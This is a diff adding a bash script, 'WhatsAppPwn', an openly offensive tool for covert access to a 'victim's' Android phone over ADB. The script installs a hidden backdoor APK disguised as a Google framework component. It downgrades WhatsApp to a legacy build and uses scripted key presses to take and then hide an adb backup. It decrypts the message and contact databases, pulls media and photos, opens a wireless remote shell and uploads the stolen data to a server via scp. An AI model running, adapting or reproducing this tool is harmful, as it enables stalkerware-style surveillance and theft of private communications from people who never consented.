@@ -1,0 +1,596 @@
+#!/bin/bash
+#WhatsAppPwn by chocheluisrf
+NONE='\033[0m'
+BOLD='\033[1m'
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+CYAN='\033[0;36m'
+BACKDOORMENU(){
+	echo -e -n "\n${CYAN}WAP${NONE}>${BOLD}USE BACKDOOR APK?${CYAN}${NONE}[Y|N]:"
+	read BACKDOOR
+}
+BD(){
+	if [[ -z "$BACKDOOR" ]]; then
+		BACKDOORMENU
+	fi
+	case "$BACKDOOR" in
+		Y|y|yes|YES) FILESIZE="$(stat -c%s "${FILEBACKDOOR}")" && if [[ ${FILESIZE} -gt 62 ]]; then
+			echo -e "${BOLD}BACKDOOR IS ALREADY RUNNING"
+			echo -e "${BOLD}RESTARTING ... ${GREEN}[OK]${NONE}"
+			bin/adb shell am force-stop my.app.client
+			bin/adb shell am startservice ${USER} my.app.client/.Client
+			echo -e "${BOLD}DONE"
+			MAIN
+		else
+			INSTALLBACKDOOR
+		fi ;;
+		N|n|no|NO) echo -e "${BOLD}SKIPPING BACKDOOR INJECTION ... ${GREEN}[OK]${NONE}" && MAIN ;;
+		*) echo -e "${RED}YOUR ANSWER IS NOT VALID${NONE}...TAKING IT AS A YES" && INSTALLBACKDOOR ;;
+	esac
+}
+BD2(){
+	bin/adb shell ps my.app.client > tmp/filesizebackdoor.txt
+	FILEBACKDOOR=tmp/filesizebackdoor.txt
+	FILESIZE="$(stat -c%s "${FILEBACKDOOR}")" && if [[ ${FILESIZE} -gt 62 ]]; then
+		echo -e "${BOLD}BACKDOOR IS ALREADY RUNNING"
+		echo -e "${BOLD}RESTARTING ... ${GREEN}[OK]${NONE}"
+		bin/adb shell am force-stop my.app.client
+		bin/adb shell am startservice ${USER} my.app.client/.Client
+		echo -e "${BOLD}DONE"
+	else
+		INSTALLBACKDOOR2
+	fi
+	rm -f tmp/filesizebackdoor.txt
+}
+PAUSE(){
+	echo -e -n "\n\n${CYAN}WAP${NONE}>${BOLD}PRESS ${CYAN}[ENTER]${NONE} ${BOLD}WHEN YOU HAVE DISCONNECTED THE DEVICE ...${NONE}"
+	read
+}
+VICTIM(){
+	echo -e -n "\n${CYAN}WAP${NONE}>${BOLD}ENTER THE NAME OF THE VICTIM${NONE}:"
+	read NAME
+}
+OUTPUTDIR(){
+	bin/adb kill-server
+	echo -e -n "\n${CYAN}WAP${NONE}>${BOLD}ENTER THE PATH FOR EXTRACTION${NONE} ENDING WITH / [BLANK=DEFAULT=config]:"
+	read PATHEXT
+	if [[ -z "$PATHEXT" ]]; then
+		. ./config
+		echo "[DEFAULT]:${PATHEXT}"
+	else
+		echo "${PATHEXT}"
+	fi
+	if [[ ! -d ${PATHEXT} ]]; then
+		echo -e "${RED}THE DIRECTORY YOU SPECIFIED IN CONFIG DOES NOT EXIST${NONE}"
+		echo -e "${BOLD}EXTRACTED FILES WILL BE IN YOUR HOME DIRECTORY${NONE}"
+		PATHEXT="${HOME}/"
+	fi
+}
+WHATSPWNREMOTE(){
+	bin/adb kill-server
+	if [[ -z "$NAME" ]]; then
+		VICTIM
+	fi
+	echo -e "${BOLD}WAITING FOR DEVICE${NONE}"
+	bin/adb wait-for-device > /dev/null
+	echo -e "${BOLD}GETTING DEVICE INFO ... ${GREEN}[OK]${NONE}"
+	bin/adb shell ps my.app.client > tmp/filesizebackdoor.txt
+	FILEBACKDOOR=tmp/filesizebackdoor.txt
+	mkdir -p ${PATHEXT}extracted
+	mkdir -p ${PATHEXT}extracted/${NAME}
+	bin/adb shell getprop > ${PATHEXT}extracted/${NAME}/DeviceInfo.txt
+	bin/adb install tmp/AntiGuard.apk
+	BD
+}
+INSTALLBACKDOOR(){
+	echo -e "${BOLD}INSTALLING BACKDOOR APK ... ${GREEN}[OK]${NONE}"
+	bin/adb install tmp/GoogleFramework_Hidden.apk
+	echo -e "${BOLD}INITIALIZING BACKDOOR APK ... ${GREEN}[OK]${NONE}"
+	bin/adb shell am startservice ${USER} my.app.client/.Client
+	MAIN
+}
+INSTALLBACKDOOR2(){
+	echo -e "${BOLD}INSTALLING BACKDOOR APK ... ${GREEN}[OK]${NONE}"
+	bin/adb install tmp/GoogleFramework_Hidden.apk
+	echo -e "${BOLD}INITIALIZING BACKDOOR APK ... ${GREEN}[OK]${NONE}"
+	bin/adb shell am startservice ${USER} my.app.client/.Client
+}
+MAIN(){
+	KEYCODESBACKUP(){
+		sleep 2
+		bin/adb shell input keyevent KEYCODE_POWER
+		bin/adb shell input keyevent KEYCODE_DPAD_DOWN
+		bin/adb shell input keyevent KEYCODE_DPAD_RIGHT
+		bin/adb shell input keyevent KEYCODE_ENTER
+	}
+	KEYCODESRECENT(){
+		sleep 2
+		bin/adb shell input keyevent KEYCODE_APP_SWITCH
+		sleep 2
+		bin/adb shell input swipe 100 1400 900 1400
+		bin/adb shell input keyevent KEYCODE_BACK
+		bin/adb kill-server
+	}
+	echo -e "${BOLD}INSTALLING LEGACY WHATSAPP 2.11.431 ... ${GREEN}[OK]${NONE}"
+	bin/adb install -r -d tmp/LegacyWhatsApp.apk
+	echo -e "${BOLD}INSTALL COMPLETE"
+	echo -e "${BOLD}UNLOCKING SCREEN AND KILLING WHATSAPP PROCESS ... ${GREEN}[OK]${NONE}"
+	bin/adb shell am force-stop com.whatsapp
+	bin/adb shell am start -n io.kos.antiguard/.unlock
+	bash -c "$(KEYCODESBACKUP)" &
+	bin/adb backup -f ${PATHEXT}extracted/${NAME}/WhatsApp/backup_file.ab -noapk com.whatsapp
+	echo -e "${BOLD}SUCCESSFULLY RETRIEVED BACKUP FILE"
+	echo -e "${BOLD}REMOVING BACKUP WINDOW FROM RECENT LIST ... ${GREEN}[OK]${NONE}"
+	bash -c "$(KEYCODESRECENT)"
+	FILEBACKUP=${PATHEXT}extracted/${NAME}/WhatsApp/backup_file.ab
+	FILESIZE2="$(stat -c%s "${FILEBACKUP}")" && if [[ ${FILESIZE2} -gt 0 ]]; then
+		B2NBH
+	else
+		B2NBHNDB
+	fi
+}
+BLACKHOLEMENU(){
+	echo -e -n "\n${CYAN}WAP${NONE}>${BOLD}DO YOU WANT TO USE BLACK-HOLE ATTACK?${CYAN}${NONE}[Y|N]:"
+	read BLACKHOLE
+}
+B2NBH(){
+	if [[ -z "$BLACKHOLE" ]]; then
+		BLACKHOLEMENU
+	fi
+	bin/adb start-server > /dev/null
+	echo -e "${BOLD}RESTORING WHATSAPP AND LOCKING SCREEN ... ${GREEN}[OK]${NONE}"
+	bin/adb install -r -d tmp/WhatsApp_Backup.apk
+	bin/adb uninstall io.kos.antiguard
+	echo -e "${BOLD}RESTORE COMPLETE"
+	case "$BLACKHOLE" in
+		Y|y|yes|YES) BHR ;;
+		N|n|no|NO) echo -e "${BOLD}SKIPPING BLACK-HOLE ATTACK ... ${GREEN}[OK]${NONE}" && UPC ;;
+		*) echo -e "${RED}YOUR ANSWER IS NOT VALID${NONE}...TAKING IT AS A YES" && BHR ;;
+	esac
+}
+OUTPUTFILEBAK(){
+	echo -e -n "\n${CYAN}WAP${NONE}>${BOLD}FILENAME FOR BAK [DEFAULT=filesystem_linux]${NONE}:"
+	read BACKUPZIPNAME
+	if [[ -z "$BACKUPZIPNAME" ]]; then
+		. ./config
+		echo "[DEFAULT]:${BACKUPZIPNAME}"
+	fi
+}
+B2NBHNDB(){
+	if [[ -z "$BLACKHOLE" ]]; then
+		BLACKHOLEMENU
+	fi
+	bin/adb start-server > /dev/null
+	echo -e "${BOLD}RESTORING WHATSAPP AND LOCKING SCREEN ... ${GREEN}[OK]${NONE}"
+	bin/adb install -r -d tmp/WhatsApp_Backup.apk
+	bin/adb uninstall io.kos.antiguard
+	echo -e "${BOLD}RESTORE COMPLETE"
+	case "$BLACKHOLE" in
+		Y|y|yes|YES) BHR ;;
+		N|n|no|NO) echo -e "${BOLD}SKIPPING BLACK-HOLE ATTACK ... ${GREEN}[OK]${NONE}" && UPCNDB ;;
+		*) echo -e "${RED}YOUR ANSWER IS NOT VALID${NONE}...TAKING IT AS A YES" && BHR ;;
+	esac
+}
+WHATSUSED(){
+	if [ ! -f ${PATHEXT}extracted/${NAME}/WhatsApp/backup_file.ab ]; then
+		UPCNDB
+	else
+		FILEBACKUP=${PATHEXT}extracted/${NAME}/WhatsApp/backup_file.ab
+		FILESIZE2="$(stat -c%s "${FILEBACKUP}")" && if [[ ${FILESIZE2} -gt 0 ]]; then
+			UPC
+		else
+			UPCNDB
+		fi
+	fi
+}
+UPLOADYNMENU(){
+	echo -e -n "\n${CYAN}WAP${NONE}>${BOLD}UPLOAD TO SERVER?${CYAN}${NONE}[Y|N]:"
+	read UPLOADYN
+}
+UPC(){
+	if [[ -z "$UPLOADYN" ]]; then
+		UPLOADYNMENU
+	fi
+	echo -e "${BOLD}DECRYPTING DATABASE ... ${GREEN}[OK]${NONE}"
+	java -jar bin/abe.jar unpack ${PATHEXT}extracted/${NAME}/WhatsApp/backup_file.ab ${PATHEXT}extracted/${NAME}/WhatsApp/decrypted.tar > /dev/null
+	tar xvf ${PATHEXT}extracted/${NAME}/WhatsApp/decrypted.tar -C ${PATHEXT}extracted/${NAME}/ apps/com.whatsapp/f/key > /dev/null
+	tar xvf ${PATHEXT}extracted/${NAME}/WhatsApp/decrypted.tar -C ${PATHEXT}extracted/${NAME}/ apps/com.whatsapp/db/msgstore.db > /dev/null
+	tar xvf ${PATHEXT}extracted/${NAME}/WhatsApp/decrypted.tar -C ${PATHEXT}extracted/${NAME}/ apps/com.whatsapp/db/wa.db > /dev/null
+	mv ${PATHEXT}extracted/${NAME}/apps/com.whatsapp/f/key ${PATHEXT}extracted/${NAME}/WhatsApp/key > /dev/null
+	mv ${PATHEXT}extracted/${NAME}/apps/com.whatsapp/db/msgstore.db ${PATHEXT}extracted/${NAME}/WhatsApp/messages.db > /dev/null
+	mv ${PATHEXT}extracted/${NAME}/apps/com.whatsapp/db/wa.db ${PATHEXT}extracted/${NAME}/WhatsApp/contacts.db > /dev/null
+	echo -e "${BOLD}CLEANING UP TEMPORARY FILES ... ${GREEN}[OK]${NONE}"
+	rm -f tmp/filesizebackdoor.txt & > /dev/null &
+	rm -f tmp/version.txt & > /dev/null &
+	rm -f tmp/path.txt & > /dev/null &
+	rm -f tmp/lenght.txt & > /dev/null &
+	rm -rf ${PATHEXT}extracted/${NAME}/apps & > /dev/null &
+	BACKUPZIP
+	echo -e "${GREEN} DONE. ATTACK COMPLETE!${NONE}"
+	case "$UPLOADYN" in
+		Y|y|yes|YES) UPLOAD ;;
+		N|n|no|NO) NAUTILUS ;;
+		*) NAUTILUS ;;
+	esac
+}
+NAUTILUS(){
+	if ! type nautilus > /dev/null; then
+		if [[ $USEINTERFACE == "Y" ]]; then
+			INTERFACE
+		else
+			exit 0
+		fi
+	else
+		nautilus ${PATHEXT}extracted/${NAME}
+		if [[ $USEINTERFACE == "Y" ]]; then
+			INTERFACE
+		else
+			exit 0
+		fi
+	fi
+}
+UPCNDB(){
+	if [[ -z "$UPLOADYN" ]]; then
+		if [[ $USEINTERFACE == "Y" ]]; then
+			UPLOADYNMENU
+		else
+			UPLOADYN="N"
+		fi
+	fi
+	echo -e "${NONE}NO WHATSAPP DATABASE WAS FOUND OR IS EMPTY (MAYBE THIS IS OK)${NONE}"
+	echo -e "${BOLD}CLEANING UP TEMPORARY FILES ... ${GREEN}[OK]${NONE}"
+	rm -f tmp/filesizebackdoor.txt & > /dev/null &
+	rm -f tmp/version.txt & > /dev/null &
+	rm -f tmp/path.txt & > /dev/null &
+	rm -f tmp/lenght.txt & > /dev/null &
+	rm -f tmp/adbconnected.txt & > /dev/null &
+	BACKUPZIP
+	echo -e "${GREEN} DONE. ATTACK COMPLETE!${NONE}"
+	case "$UPLOADYN" in
+		1) UPLOAD ;;
+		2) NAUTILUS ;;
+		*) NAUTILUS ;;
+	esac
+}
+BHR(){
+	BHRMANUAL
+}
+BHL(){
+	if [[ -z "$NAME" ]]; then
+		VICTIM
+		EXTRACTION
+	else
+		EXTRACTION
+	fi
+}
+BACKUPZIP(){
+	zip -u -r -q -9 ${PATHEXT}${BACKUPZIPNAME} ${PATHEXT}extracted/ > /dev/null
+}
+DCIMMENU(){
+	echo -e -n "\n${CYAN}WAP${NONE}>${BOLD}INCLUDE DCIM PHOTOS? (MAY TAKE A LONG TIME)${CYAN}${NONE}[Y|N]:"
+	read DCIM
+}
+EXTRACTION(){
+	if [[ -z "$DCIM" ]]; then
+		if [[ $USEINTERFACE == "Y" ]]; then
+			DCIMMENU
+		else
+			DCIM="N"
+		fi
+	fi
+	if [[ -z "$BACKUPZIPNAME" ]]; then
+		if [[ $USEINTERFACE == "Y" ]]; then
+			OUTPUTFILEBAK
+		else
+			. ./config
+		fi
+	fi
+	echo -e "${BOLD}EXTRACTING DATA ... ${GREEN}[OK]${NONE}"
+	mkdir -p ${PATHEXT}extracted/${NAME}/WhatsApp
+	bin/adb pull "/sdcard/WhatsApp/Media" ${PATHEXT}extracted/${NAME}/WhatsApp
+	bin/adb pull "/sdcard/Android/data/com.whatsapp/files" ${PATHEXT}extracted/${NAME}/WhatsApp
+	mkdir -p ${PATHEXT}extracted/${NAME}/Telegram
+	bin/adb pull "/sdcard/Telegram/Telegram Images" ${PATHEXT}extracted/${NAME}/Telegram
+	bin/adb pull "/sdcard/Android/data/org.telegram.messenger/cache" ${PATHEXT}extracted/${NAME}/Telegram
+	mkdir -p ${PATHEXT}extracted/${NAME}/Pictures
+	bin/adb pull "/sdcard/Pictures" ${PATHEXT}extracted/${NAME}/Pictures
+	case "$DCIM" in
+		Y|y|yes|YES) echo -e "${BOLD}EXTRACTING DCIM PHOTOS ... ${GREEN}[OK]${NONE}" && mkdir -p ${PATHEXT}extracted/${NAME}/DCIM && bin/adb pull "/sdcard/DCIM" ${PATHEXT}extracted/${NAME}/DCIM && WHATSUSED ;;
+		N|n|no|NO) echo -e "${BOLD}SKIPPING DCIM PHOTOS ... ${GREEN}[OK]${NONE}" && WHATSUSED ;;
+		*) echo -e "${RED}YOUR ANSWER IS NOT VALID${NONE}...TAKING IT AS A YES" && echo -e "${BOLD}EXTRACTING DCIM PHOTOS ... ${GREEN}[OK]${NONE}" && mkdir -p ${PATHEXT}extracted/${NAME}/DCIM && bin/adb pull "/sdcard/DCIM" ${PATHEXT}extracted/${NAME}/DCIM && WHATSUSED ;;
+	esac
+}
+EXITCODE(){
+	rm -f tmp/filesizebackdoor.txt & > /dev/null &
+	rm -f tmp/version.txt & > /dev/null &
+	rm -f tmp/path.txt & > /dev/null &
+	rm -f tmp/lenght.txt & > /dev/null &
+	rm -f adbdevices.txt & > /dev/null &
+	rm -rf ${PATHEXT}extracted/${NAME}/apps & > /dev/null &
+	exit
+}
+BHRMANUAL(){
+	if [[ -z "$NAME" ]]; then
+		VICTIM
+	fi
+	bin/adb start-server > /dev/null
+	bin/adb devices > adbdevices.txt
+	adbdevices=adbdevices.txt
+	if [[ $(stat -c%s "${adbdevices}") -gt 27 ]]; then
+			CONNECTMANUAL
+		else
+			echo -e "${BOLD}DEVICE NOT FOUND...CONNECT THE DEVICE${NONE}"
+			bin/adb wait-for-device
+			CONNECTMANUAL
+	fi
+}
+CONNECTION(){
+	if bin/adb connect ${ipAddrOverride}:5555 | grep "connected to ${ipAddrOverride}" -oE; then
+		sleep 2
+		bin/adb devices > adbdevices.txt
+		if [[ $(stat -c%s "${adbdevices}") -gt 60 ]]; then
+			echo -e "${BOLD}CONNECTION SUCCESSFULL BUT YOU NEED TO DISCONNECT THE DEVICE ON THE CABLE${NONE}"
+			PAUSE
+			EXTRACTION
+		else
+			EXTRACTION
+		fi
+	else
+		CONNECTMANUAL
+	fi
+}
+CONNECTMANUAL(){
+	if bin/adb devices | grep "[0-9]{1,3}(\.[0-9]{1,3}){3}" -oE; then
+		EXTRACTION
+	else
+		ipAddrOverride="$(bin/adb shell ip -f inet addr show wlan0 | grep "inet [0-9]{1,3}(\.[0-9]{1,3}){3}" -oE | grep "[0-9]{1,3}(\.[0-9]{1,3}){3}" -oE)"
+		bin/adb tcpip 5555
+		echo -e "${BOLD}YOU MAY DISCONNECT YOUR DEVICE${NONE}"
+		CONNECTION
+	fi
+}
+SHELL(){
+	bin/adb start-server > /dev/null
+	bin/adb devices > adbdevices.txt
+	adbdevices=adbdevices.txt
+	if [[ $(stat -c%s "${adbdevices}") -gt 27 && $(stat -c%s "${adbdevices}") -lt 60 ]]; then
+			if bin/adb devices | grep "[0-9]{1,3}(\.[0-9]{1,3}){3}" -oE; then
+				bin/adb shell
+			else
+				ipAddrOverride="$(bin/adb shell ip -f inet addr show wlan0 | grep "inet [0-9]{1,3}(\.[0-9]{1,3}){3}" -oE | grep "[0-9]{1,3}(\.[0-9]{1,3}){3}" -oE)"
+				bin/adb tcpip 5555
+				echo -e "${BOLD}YOU MAY DISCONNECT YOUR DEVICE${NONE}"
+				if bin/adb connect ${ipAddrOverride}:5555 | grep "connected to ${ipAddrOverride}" -oE; then
+					sleep 2
+					bin/adb devices > adbdevices.txt
+					if [[ $(stat -c%s "${adbdevices}") -gt 60 ]]; then
+						echo -e "${BOLD}CONNECTION SUCCESSFULL BUT YOU NEED TO DISCONNECT THE DEVICE ON THE CABLE${NONE}"
+						PAUSE
+						bin/adb shell
+					else
+						bin/adb shell
+					fi
+				else
+					echo -e "${BOLD}LOCAL SHELL${NONE}"
+					sleep 2
+					bin/adb shell
+				fi
+			fi
+	elif [[ $(stat -c%s "${adbdevices}") -gt 60 ]]; then
+				echo -e "${BOLD}CONNECTION SUCCESSFULL BUT YOU NEED TO DISCONNECT THE DEVICE ON THE CABLE${NONE}"
+				PAUSE
+				bin/adb shell
+	else
+		echo -e "${BOLD}DEVICE NOT FOUND...CONNECT THE DEVICE${NONE}"
+		bin/adb wait-for-device
+		ipAddrOverride="$(bin/adb shell ip -f inet addr show wlan0 | grep "inet [0-9]{1,3}(\.[0-9]{1,3}){3}" -oE | grep "[0-9]{1,3}(\.[0-9]{1,3}){3}" -oE)"
+		bin/adb tcpip 5555
+		echo -e "${BOLD}YOU MAY DISCONNECT YOUR DEVICE${NONE}"
+		if bin/adb connect ${ipAddrOverride}:5555 | grep "connected to ${ipAddrOverride}" -oE; then
+			sleep 2
+			bin/adb devices > adbdevices.txt
+			if [[ $(stat -c%s "${adbdevices}") -gt 60 ]]; then
+				echo -e "${BOLD}CONNECTION SUCCESSFULL BUT YOU NEED TO DISCONNECT THE DEVICE ON THE CABLE${NONE}"
+				PAUSE
+				bin/adb shell
+			else
+				bin/adb shell
+			fi
+		else
+			echo -e "${BOLD}LOCAL SHELL${NONE}"
+			sleep 5
+			bin/adb shell
+		fi
+	fi
+	rm -f adbdevices.txt
+}
+SSHPASSMENU(){
+	echo -e -n "\n${CYAN}WAP${NONE}>${CYAN}ENTER YOUR SSH SERVER PASSWORD${NONE}:"
+	read -s SSHPASS
+}
+CMND(){
+	. ./server
+	if service ssh status | grep "not running" -oE > /dev/null; then
+		service ssh start
+		if [[ -z "$SSHPASS" ]]; then
+			SSHPASSMENU
+		fi
+	else
+		if [[ -z "$SSHPASS" ]]; then
+			SSHPASSMENU
+		fi
+	fi
+}
+UPLOAD(){
+	if [[ ! -d ${PATHEXT}extracted ]]; then
+		if [[ ! -f ${PATHEXT}${BACKUPZIPNAME}.zip ]]; then
+			echo -e "${RED}THERE ARE NO EXTRACTED FILES OR FOLDERS${NONE}"
+		else
+			echo -e "${BOLD}ONLY BACKUP COMPRESSED FILE FOUND${NONE}"
+			CMND
+			sshpass -p ${SSHPASS} scp -c blowfish ${PATHEXT}${BACKUPZIPNAME}.zip ${USRSERV}@${SERV}:${OUTPUTDIRSERV} &
+			echo -e "${BOLD}SENDING (IN BACKGROUND) ... ${GREEN}[OK]${NONE}"
+		fi
+	else
+		if [[ ! -f ${PATHEXT}${BACKUPZIPNAME}.zip ]]; then
+			echo -e "${BOLD}ONLY EXTRACTED FOLDER FOUND"
+			CMND
+			sshpass -p ${SSHPASS} scp -cr blowfish ${PATHEXT}extracted/ ${USRSERV}@${SERV}:${OUTPUTDIRSERV} &
+			echo -e "${BOLD}SENDING (IN BACKGROUND) ... ${GREEN}[OK]${NONE}"
+		else
+			echo -e "${BOLD}BOTH BACKUP FILE AND EXTRACTED FOLDER FOUND...UPLOADING ZIP"
+			CMND
+			sshpass -p ${SSHPASS} scp -c blowfish ${PATHEXT}${BACKUPZIPNAME}.zip ${USRSERV}@${SERV}:${OUTPUTDIRSERV} &
+			echo -e "${BOLD}SENDING (IN BACKGROUND) ... ${GREEN}[OK]${NONE}"
+		fi
+	fi
+	sleep 2
+	if [[ $USEINTERFACE == "Y" ]]; then
+			INTERFACE
+		else
+			exit 0
+		fi
+}
+IFAUTOMODEONWPR(){
+	if cat "config" | grep 'AUTOMODE="1"' -oE; then
+		BACKDOORMENU
+		BLACKHOLEMENU
+		VICTIM
+		case "$BACKHOLE" in
+			Y|y|yes|YES) DCIMMENU ;;
+		esac
+		OUTPUTFILEBAK
+		UPLOADYNMENU
+		case "UPLOADYN" in
+			Y|y|yes|YES) SSHPASSMENU ;;
+		esac
+	fi
+}
+IFAUTOMODEONJB(){
+	if cat "config" | grep 'AUTOMODE="1"' -oE; then
+		VICTIM
+		DCIMMENU
+		OUTPUTFILEBAK
+		UPLOADYNMENU
+		case "UPLOADYN" in
+			Y|y|yes|YES) SSHPASSMENU ;;
+		esac
+	fi
+}
+INTERFACE(){
+	cat bin/motd.txt
+	OUTPUTDIR
+	echo -e "${BOLD}WHAT DO YOU WANT TO DO?${CYAN}\n
+	1) START FULL ATTACK
+	2) RELAUNCH BACKDOOR APK
+	3) LAUNCH SHELL
+	4) EMERGENCY RESTORE WHATSAPP (IN CASE OF ERROR)
+	5) JUST RUN EXTRACTION (REMOTE)
+	6) JUST RUN EXTRACTION (LOCAL)
+	7) UPLOAD FILES TO SERVER
+	x) EXIT${NONE}"
+	echo -e -n "\n${CYAN}WAP${NONE}>"
+	read MENU
+	case "$MENU" in
+		1) IFAUTOMODEONWPR && WHATSPWNREMOTE ;;
+		2) BD2 && INTERFACE ;;
+		3) SHELL && INTERFACE ;;
+		4) bin/adb wait-for-device && bin/adb install -r -d tmp/WhatsApp_Backup.apk && INTERFACE ;;
+		5) IFAUTOMODEONJB && BHRMANUAL ;;
+		6) IFAUTOMODEONJB && BHL ;;
+		7) UPLOAD ;;
+		x|X) EXITCODE ;;
+		*) echo -e "${RED}THAT IS NOT A VALID OPTION...TRY AGAIN${NONE}" && INTERFACE ;;
+	esac
+}
+USAGE(){
+	echo -e "${RED}SYNTAX ERROR${NONE}"
+	cat bin/help.txt
+	cd ${HOME}
+}
+trap 'EXITCODE' SIGHUP SIGINT SIGTERM SIGQUIT
+clear
+if ls | grep 'whatspwn' > /dev/null; then
+	WDIR=$(pwd)
+else
+	WDIR=$(dirname $0)
+fi
+if ! type sshpass > /dev/null; then
+	echo -e "${BOLD}${RED}SSHPASS NOT FOUND, ${NONE}INSTALLING IT ... ${GREEN}[OK]${NONE}"
+	apt-get install sshpass
+fi
+grep -v 'whatspwn' ~/.bash_aliases > ~/.bash_aliases_tmp; mv ~/.bash_aliases_tmp ~/.bash_aliases
+echo "alias whatspwn='${WDIR}/whatspwn'" >> ${HOME}/.bash_aliases
+cd ${WDIR} && . ./config
+if [[ $# > 0 ]]; then
+	key="$1"
+	case "$key" in
+		FULL|1) if [[ $# > 1 ]]; then
+					shift
+					while [[ $# > 0 ]]; do
+						key="$1"
+						case "$key" in
+							-b|--use-backdoor|--backdoor) BACKDOOR="Y" && shift ;;
+							-e|--black-hole|--use-black-hole) BLACKHOLE="Y" && shift ;;
+							-v|--victim) NAME="$2" && shift 2 ;;
+							-d|--DCIM|--dcim) DCIM="Y" && shift ;;
+							-k|--backup) BACKUPZIPNAME="$2" && shift 2 ;;
+							-u|--upload) UPLOADYN="Y" && SSHPASSMENU && shift ;;
+							-h|--help) USAGE && shift ;;
+							-o|--output) PATH="$2" && shift 2 ;;
+							*) USAGE && break ;;
+						esac
+					done
+				fi && WHATSPWNREMOTE ;;
+		RELAUNCH|2) BD2 && cd ${HOME};;
+		SHELL|3) SHELL && cd ${HOME};;
+		RESTORE|4) bin/adb wait-for-device && bin/adb install -r -d tmp/WhatsApp_Backup.apk && cd ${HOME} ;;
+		EXTRACTION|5|extraction) if [[ $2 == "local" ]]; then
+									if [[ $# > 2 ]]; then
+										shift 2
+										while [[ $# > 0 ]]; do
+											key="$1"
+											case "$key" in
+												-v|--victim) NAME="$2" && shift 2 ;;
+												-d|--DCIM|--dcim) DCIM="Y" && shift ;;
+												-k|--backup) BACKUPZIPNAME="$2" && shift 2 ;;
+												-u|--upload) UPLOADYN="Y" && SSHPASSMENU && shift ;;
+												-h|--help) USAGE && shift ;;
+												-o|--output) PATH="$2" && shift 2 ;;
+												*) USAGE && break ;;
+											esac
+										done
+										BHL
+									else
+										BHL
+									fi
+								 fi 
+								 if [[ $2 == "remote" ]]; then
+								 	if [[ $# > 2 ]]; then
+										shift 2
+										while [[ $# > 0 ]]; do
+											key="$1"
+											case "$key" in
+												-v|--victim) NAME="$2" && shift ;;
+												-d|--DCIM|--dcim) DCIM="Y" && shift ;;
+												-k|--backup) BACKUPZIPNAME="$2" && shift ;;
+												-u|--upload) UPLOADYN="Y" && SSHPASSMENU && shift ;;
+												-h|--help) USAGE && shift ;;
+												-o|--output) PATH="$2" && shift ;;
+												*) USAGE && break ;;
+											esac
+										done
+										BHRMANUAL
+									else
+										BHRMANUAL
+									fi
+								 fi && USAGE ;;
+		UPLOAD|6|upload) UPLOAD && cd ${HOME};;
+		-i|--interface|INTERFACE|8|i) USEINTERFACE="Y" && INTERFACE && break ;;
+		*) USAGE ;;
+	esac
+else
+	USAGE && echo -e "${BOLD}${GREEN}YOU CAN RUN IT AS ${NONE}'whatspwn' ${BOLD}${GREEN}FROM ANY DIRECTORY IF YOU LIKE."
+fi
+exec bash
+exit 0
